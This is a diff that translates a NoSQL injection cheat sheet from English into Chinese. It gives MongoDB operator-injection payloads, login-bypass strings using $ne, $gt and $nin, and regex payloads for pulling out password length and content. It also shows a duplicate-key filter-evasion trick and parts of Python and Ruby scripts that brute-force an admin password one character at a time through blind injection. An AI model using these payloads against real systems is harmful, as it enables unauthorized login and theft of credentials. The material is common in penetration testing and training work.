@@ -1,62 +1,64 @@
-# NoSQL Injection
+[README.en.md](README.en.md)
 
-> NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.
+# NoSQL 注入
 
-## Summary
+> NoSQL 数据库提供的松散一致性约束比传统 SQL 数据库更少。通过需要更少的关系约束和一致性检查，NoSQL 数据库通常提供性能和扩展性优势。然而，这些数据库仍然可能容易受到注入攻击的影响，即使它们不使用传统的 SQL 语法。
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Operator Injection](#operator-injection)
-    * [Authentication Bypass](#authentication-bypass)
-    * [Extract Length Information](#extract-length-information)
-    * [Extract Data Information](#extract-data-information)
-    * [WAF and Filters](#waf-and-filters)
-* [Blind NoSQL](#blind-nosql)
-    * [POST with JSON Body](#post-with-json-body)
-    * [POST with urlencoded Body](#post-with-urlencoded-body)
+## 摘要
+
+* [工具](#tools)
+* [方法](#methodology)
+    * [操作符注入](#operator-injection)
+    * [身份验证绕过](#authentication-bypass)
+    * [提取长度信息](#extract-length-information)
+    * [提取数据信息](#extract-data-information)
+    * [WAF 和过滤器](#waf-and-filters)
+* [盲注 NoSQL](#blind-nosql)
+    * [带 JSON 体的 POST](#post-with-json-body)
+    * [带 urlencoded 体的 POST](#post-with-urlencoded-body)
     * [GET](#get)
-* [Labs](#references)
-* [References](#references)
+* [实验室](#references)
+* [参考资料](#references)
 
-## Tools
+## 工具
 
-* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - Automated NoSQL database enumeration and web application exploitation tool
-* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - A lab for playing with NoSQL Injection
-* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - This extension provides a way to discover NoSQL injection vulnerabilities.
+* [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) - 自动化的 NoSQL 数据库枚举和 Web 应用程序利用工具
+* [digininja/nosqlilab](https://github.com/digininja/nosqlilab) - 用于玩弄 NoSQL 注入的实验室
+* [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) - 该扩展提供发现 NoSQL 注入漏洞的方法。
 
-## Methodology
+## 方法
 
-NoSQL injection occurs when an attacker manipulates queries by injecting malicious input into a NoSQL database query. Unlike SQL injection, NoSQL injection often exploits JSON-based queries and operators like `$ne`, `$gt`, `$regex`, or `$where` in MongoDB.
+当攻击者通过将恶意输入注入到 NoSQL 数据库查询中来操纵查询时，就会发生 NoSQL 注入。与 SQL 注入不同，NoSQL 注入通常利用基于 JSON 的查询和 MongoDB 中的操作符，如 `$ne`、`$gt`、`$regex` 或 `$where`。
 
-### Operator Injection
+### 操作符注入
 
-| Operator | Description        |
+| 操作符 | 描述        |
 | -------- | ------------------ |
-| $ne      | not equal          |
-| $regex   | regular expression |
-| $gt      | greater than       |
-| $lt      | lower than         |
-| $nin     | not in             |
+| $ne      | 不等于          |
+| $regex   | 正则表达式 |
+| $gt      | 大于       |
+| $lt      | 小于         |
+| $nin     | 不在             |
 
-Example: A web application has a product search feature
+示例：一个 Web 应用程序具有产品搜索功能
 
 ```js
 db.products.find({ "price": userInput })
 ```
 
-An attacker can inject a NoSQL query: `{ "$gt": 0 }`.
+攻击者可以注入 NoSQL 查询：`{ "$gt": 0 }`。
 
 ```js
 db.products.find({ "price": { "$gt": 0 } })
 ```
 
-Instead of returning a specific product, the database returns all products with a price greater than zero, leaking data.
+数据库返回价格大于零的所有产品而不是特定产品，从而泄露数据。
 
-### Authentication Bypass
+### 身份验证绕过
 
-Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
+使用不等于（`$ne`）或大于（`$gt`）的基本身份验证绕过
 
-* HTTP data
+* HTTP 数据
 
   ```ps1
   username[$ne]=toto&password[$ne]=toto
@@ -65,7 +67,7 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
   ```
 
-* JSON data
+* JSON 数据
 
   ```json
   {"username": {"$ne": null}, "password": {"$ne": null}}
@@ -74,20 +76,20 @@ Basic authentication bypass using not equal (`$ne`) or greater (`$gt`)
   {"username": {"$gt":""}, "password": {"$gt":""}}
   ```
 
-### Extract Length Information
+### 提取长度信息
 
-Inject a payload using the $regex operator. The injection will work when the length is correct.
+使用 $regex 操作符注入负载。当长度正确时，注入将生效。
 
 ```ps1
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Extract Data Information
+### 提取数据信息
 
-Extract data with "`$regex`" query operator.
+使用"`$regex`"查询操作符提取数据。
 
-* HTTP data
+* HTTP 数据
 
   ```ps1
   username[$ne]=toto&password[$regex]=m.{2}
@@ -98,7 +100,7 @@ Extract data with "`$regex`" query operator.
   username[$ne]=toto&password[$regex]=md.*
   ```
 
-* JSON data
+* JSON 数据
 
   ```json
   {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
@@ -106,29 +108,29 @@ Extract data with "`$regex`" query operator.
   {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
   ```
 
-Extract data with "`$in`" query operator.
+使用"`$in`"查询操作符提取数据。
 
 ```json
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
-### WAF and Filters
+### WAF 和过滤器
 
-**Remove pre-condition**:
+**移除先决条件**:
 
-In MongoDB, if a document contains duplicate keys, only the last occurrence of the key will take precedence.
+在 MongoDB 中，如果文档包含重复键，只有键的最后一次出现将优先。
 
 ```js
 {"id":"10", "id":"100"} 
 ```
 
-In this case, the final value of "id" will be "100".
+在这种情况下，"id" 的最终值将是"100"。
 
-## Blind NoSQL
+## 盲注 NoSQL
 
-### POST with JSON Body
+### 带 JSON 体的 POST
 
-Python script:
+Python 脚本：
 
 ```python
 import requests
@@ -152,9 +154,9 @@ while True:
                 password += c
 ```
 
-### POST with urlencoded Body
+### 带 urlencoded 体的 POST
 
-Python script:
+Python 脚本：
 
 ```python
 import requests
@@ -180,7 +182,7 @@ while True:
 
 ### GET
 
-Python script:
+Python 脚本：
 
 ```python
 import requests
@@ -203,7 +205,7 @@ while True:
         password += c
 ```
 
-Ruby script:
+Ruby 脚本：
 
 ```ruby
 require 'httpx'
@@ -211,8 +213,8 @@ require 'httpx'
 username = 'admin'
 password = ''
 url = 'http://example.org/login'
-# CHARSET = (?!..?~).to_a # all ASCII printable characters
-CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
+# CHARSET = (?!..?~).to_a # 所有 ASCII 可打印字符
+CHARSET = [*'0'..'9',*'a'..'z','-'] # 字母数字 + '-'
 GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
 session = HTTPX.plugin(:persistent)
 
@@ -230,18 +232,18 @@ while true
 end
 ```
 
-## Labs
+## 实验室
 
-* [Root Me - NoSQL injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
-* [Root Me - NoSQL injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)
+* [Root Me - NoSQL 注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Authentication)
+* [Root Me - NoSQL 注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/NoSQL-injection-Blind)
 
-## References
+## 参考资料
 
-* [Burp-NoSQLiScanner - matrix - January 30, 2021](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
-* [Getting rid of pre- and post-conditions in NoSQL injections - Reino Mostert - March 11, 2025](https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
-* [Les NOSQL injections Classique et Blind: Never trust user input - Geluchat - February 22, 2015](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
-* [MongoDB NoSQL Injection with Aggregation Pipelines - Soroush Dalili (@irsdl) - June 23, 2024](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
-* [NoSQL error-based injection - Reino Mostert - March 15, 2025](https://sensepost.com/blog/2025/nosql-error-based-injection/)
-* [NoSQL Injection in MongoDB - Zanon - July 17, 2016](https://zanon.io/posts/nosql-injection-in-mongodb)
-* [NoSQL injection wordlists - cr0hn - May 5, 2021](https://github.com/cr0hn/nosqlinjection_wordlists)
-* [Testing for NoSQL injection - OWASP - May 2, 2023](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
+* [Burp-NoSQLiScanner - matrix - 2021年1月30日](https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java)
+* [摆脱 NoSQL 注入中的前条件和后条件 - Reino Mostert - 2025年3月11日](https://sensepost.com/blog/2025/getting-rid-of-pre-and-post-conditions-in-nosql-injections/)
+* [经典和盲注 NOSQL 注入：永远不要相信用户输入 - Geluchat - 2015年2月22日](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
+* [带有聚合管道的 MongoDB NoSQL 注入 - Soroush Dalili (@irsdl) - 2024年6月23日](https://soroush.me/blog/2024/06/mongodb-nosql-injection-with-aggregation-pipelines/)
+* [基于错误的 NoSQL 注入 - Reino Mostert - 2025年3月15日](https://sensepost.com/blog/2025/nosql-error-based-injection/)
+* [MongoDB 中的 NoSQL 注入 - Zanon - 2016年7月17日](https://zanon.io/posts/nosql-injection-in-mongodb)
+* [NoSQL 注入单词列表 - cr0hn - 2021年5月5日](https://github.com/cr0hn/nosqlinjection_wordlists)
+* [测试 NoSQL 注入 - OWASP - 2023年5月2日](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
